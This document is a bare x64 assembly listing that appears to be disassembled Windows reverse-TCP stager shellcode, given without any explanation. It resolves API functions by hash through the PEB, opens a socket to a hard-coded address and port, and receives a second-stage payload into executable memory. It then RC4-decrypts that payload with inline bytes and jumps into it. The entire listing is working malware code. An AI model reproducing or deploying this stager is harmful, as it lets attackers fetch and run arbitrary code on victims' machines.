```asm
_start:
cld
nop
and rsp, 0xfffffffffffffff0
nop
call L_d6
RET_a:
push r9
push r8
push rdx
push rcx
push rsi
nop
xor rdx, rdx
nop
mov rdx, qword ptr gs:[rdx + 0x60]
mov rdx, qword ptr [rdx + 0x18]
mov rdx, qword ptr [rdx + 0x20]
L_21:
movzx rcx, word ptr [rdx + 0x4a]
xor r9, r9
mov rsi, qword ptr [rdx + 0x50]
L_2d:
xor rax, rax
lodsb al, byte ptr [rsi]
cmp al, 0x61
jl L_37
sub al, 0x20
L_37:
ror r9d, 0xd
add r9d, eax
loop L_2d
nop
push rdx
mov rdx, qword ptr [rdx + 0x20]
mov eax, dword ptr [rdx + 0x3c]
push r9
add rax, rdx
nop
cmp word ptr [rax + 0x18], 0x20b
jne L_cb
mov eax, dword ptr [rax + 0x88]
test rax, rax
je L_cb
add rax, rdx
push rax
mov ecx, dword ptr [rax + 0x18]
mov r8d, dword ptr [rax + 0x20]
add r8, rdx
L_72:
jrcxz L_ca
dec rcx
mov esi, dword ptr [r8 + rcx*4]
add rsi, rdx
xor r9, r9
L_81:
xor rax, rax
lodsb al, byte ptr [rsi]
ror r9d, 0xd
add r9d, eax
cmp al, ah
jne L_81
add r9, qword ptr [rsp + 8]
cmp r9d, r10d
jne L_72
pop rax
mov r8d, dword ptr [rax + 0x24]
add r8, rdx
mov cx, word ptr [r8 + rcx*2]
mov r8d, dword ptr [rax + 0x1c]
add r8, rdx
mov eax, dword ptr [r8 + rcx*4]
add rax, rdx
pop r8
pop r8
pop rsi
pop rcx
pop rdx
pop r8
pop r9
pop r10
sub rsp, 0x20
push r10
jmp rax
L_ca:
pop rax
L_cb:
nop
pop r9
pop rdx
mov rdx, qword ptr [rdx]
jmp L_21
L_d6:
pop rbp
nop
movabs r14, 0x32335f327377
nop
push r14
mov r14, rsp
sub rsp, 0x1a0
nop
mov r13, rsp
nop
movabs r12, 0x100007fd2040002
push r12
mov r12, rsp
nop
mov rcx, r14
mov r10d, 0x726774c
call rbp
mov rdx, r13
push 0x101
pop rcx
mov r10d, 0x6b8029
call rbp
push 0xa
pop r14
L_11f:
push rax
push rax
xor r9, r9
xor r8, r8
inc rax
mov rdx, rax
inc rax
mov rcx, rax
mov r10d, 0xe0df0fea
call rbp
mov rdi, rax
L_13e:
push 0x10
pop r8
mov rdx, r12
mov rcx, rdi
mov r10d, 0x6174a599
call rbp
test eax, eax
je L_15e
dec r14
jne L_13e
call L_27d
L_15e:
sub rsp, 0x10
mov rdx, rsp
xor r9, r9
push 4
pop r8
mov rcx, rdi
mov r10d, 0x5fc8d902
call rbp
cmp eax, 0
jle L_1ed
add rsp, 0x20
pop rsi
mov esi, esi
xor esi, 0xd3a205a0
lea r11, [rsi + 0x100]
push 0x40
pop r9
push 0x1000
pop r8
mov rdx, rsi
xor rcx, rcx
mov r10d, 0xe553a458
call rbp
lea rbx, [rax + 0x100]
mov r15, rbx
push rbx
push rsi
push rax
L_1ba:
xor r9, r9
mov r8, rsi
mov rdx, rbx
mov rcx, rdi
mov r10d, 0x5fc8d902
call rbp
add rsp, 0x20
cmp eax, 0
jge L_1ff
pop rax
push r15
pop rcx
push 0x4000
pop r8
push 0
pop rdx
mov r10d, 0x300f2f0b
call rbp
L_1ed:
push rdi
pop rcx
mov r10d, 0x614d6e75
call rbp
dec r14
jmp L_11f
L_1ff:
add rbx, rax
sub rsi, rax
jne L_1ba
mov r14, rdi
pop rdi
pop rcx
pop r9
push r14
call L_225
xor al, 0x2a
push 0x53d0a27e
.byte 0x60, 0xc9, 0x53, 0x10, 0x7a, 0xcb, 0xe8, 0x3e, 0x08
L_225:
.byte 0x5e, 0x48, 0x31, 0xc0, 0x49, 0x89, 0xf8, 0xaa, 0xfe, 0xc0, 0x75, 0xfb, 0x48, 0x31, 0xdb, 0x41, 0x02, 0x1c, 0x00, 0x48, 0x89, 0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c, 0x16, 0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0xfe, 0xc0, 0x75, 0xe3, 0x48, 0x31, 0xdb, 0xfe, 0xc0, 0x41, 0x02, 0x1c, 0x00, 0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0x41, 0x02, 0x14, 0x18, 0x41, 0x8a, 0x14, 0x10, 0x41, 0x30, 0x11, 0x49, 0xff, 0xc1, 0x48, 0xff, 0xc9, 0x75, 0xdb, 0x5f, 0x41, 0xff, 0xe7
L_27d:
.byte 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
```